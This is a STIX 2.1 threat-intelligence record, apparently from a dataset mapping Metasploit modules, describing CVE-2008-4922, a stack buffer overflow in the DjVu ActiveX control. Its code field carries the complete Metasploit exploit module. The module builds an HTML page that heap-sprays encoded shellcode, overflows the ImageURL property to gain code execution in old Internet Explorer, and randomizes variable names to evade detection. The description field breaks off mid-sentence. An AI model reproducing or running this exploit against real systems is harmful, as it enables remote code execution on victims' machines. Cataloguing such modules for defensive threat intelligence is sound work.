{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8d1ecc90-c399-4f43-8c23-a1f4e7fe196e",
    "created": "2024-08-14T16:36:10.601646Z",
    "modified": "2024-08-14T16:36:10.60165Z",
    "name": "DjVu DjVu_ActiveX_MSOffice.dll ActiveX ComponentBuffer Overflow",
    "description": " This module exploits a stack buffer overflow in DjVu ActiveX Component. When sending an",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/djvu_imageurl.rb",
            "external_id": "djvu_imageurl.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-4922"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = LowRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'DjVu DjVu_ActiveX_MSOffice.dll ActiveX ComponentBuffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in DjVu ActiveX Component. When sending an\n        overly long string to the ImageURL() property of DjVu_ActiveX_MSOffice.dll (3.0)\n        an attacker may be able to execute arbitrary code. This control is not marked safe\n        for scripting, so choose your attack vector accordingly.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'dean <dean[at]zerodaysolutions.com>' ],\n      'References'     =>\n        [\n          [ 'CVE', '2008-4922' ],\n          [ 'OSVDB', '49592' ],\n          [ 'BID', '31987' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP0-SP3 / Windows Vista / IE 6.0 SP0-SP2 / IE 7', { 'Ret' => 0x0A0A0A0A } ]\n        ],\n      'DisclosureDate' => '2008-10-30',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.html']),\n      ])\n  end\n\n  def exploit\n    # Encode the shellcode.\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Create some nops.\n    nops    = Rex::Text.to_unescape(make_nops(4))\n\n    # Set the return.\n    ret     = Rex::Text.uri_encode([target.ret].pack('L'))\n\n    # Randomize the javascript variable names.\n    vname  = rand_text_alpha(rand(100) + 1)\n    var_i  = rand_text_alpha(rand(30)  + 2)\n    rand1  = rand_text_alpha(rand(100) + 1)\n    rand2  = rand_text_alpha(rand(100) + 1)\n    rand3  = rand_text_alpha(rand(100) + 1)\n    rand4  = rand_text_alpha(rand(100) + 1)\n    rand5  = rand_text_alpha(rand(100) + 1)\n    rand6  = rand_text_alpha(rand(100) + 1)\n    rand7  = rand_text_alpha(rand(100) + 1)\n    rand8  = rand_text_alpha(rand(100) + 1)\n\n    content = %Q|\n<html>\n<object id='#{vname}' classid='clsid:4A46B8CD-F7BD-11D4-B1D8-000102290E7C'></object>\n<script language=\"JavaScript\">\nvar #{rand1} = unescape('#{shellcode}');\nvar #{rand2} = unescape('#{nops}');\nvar #{rand3} = 20;\nvar #{rand4} = #{rand3} + #{rand1}.length;\nwhile (#{rand2}.length < #{rand4}) #{rand2} += #{rand2};\nvar #{rand5} = #{rand2}.substring(0,#{rand4});\nvar #{rand6} = #{rand2}.substring(0,#{rand2}.length - #{rand4});\nwhile (#{rand6}.length + #{rand4} < 0x40000) #{rand6} = #{rand6} + #{rand6} + #{rand5};\nvar #{rand7} = new Array();\nfor (#{var_i} = 0; #{var_i} < 400; #{var_i}++){ #{rand7}[#{var_i}] = #{rand6} + #{rand1} }\nvar #{rand8} = \"\";\nfor (#{var_i} = 0; #{var_i} < 2024; #{var_i}++) { #{rand8} = #{rand8} + unescape('#{ret}') }\n#{vname}.ImageURL = #{rand8};\n</script>\n</html>\n|\n\n    content = Rex::Text.randomize_space(content)\n\n    print_status(\"Creating HTML file ...\")\n\n    file_create(content)\n  end\nend\n",
    "x_mitre_contributors": [
        "[ dean <dean[at]zerodaysolutions.com> ]",
        ""
    ],
    "x_mitre_disclosure_date": "2008-10-30",
    "x_mitre_platforms": [
        "win'"
    ]
}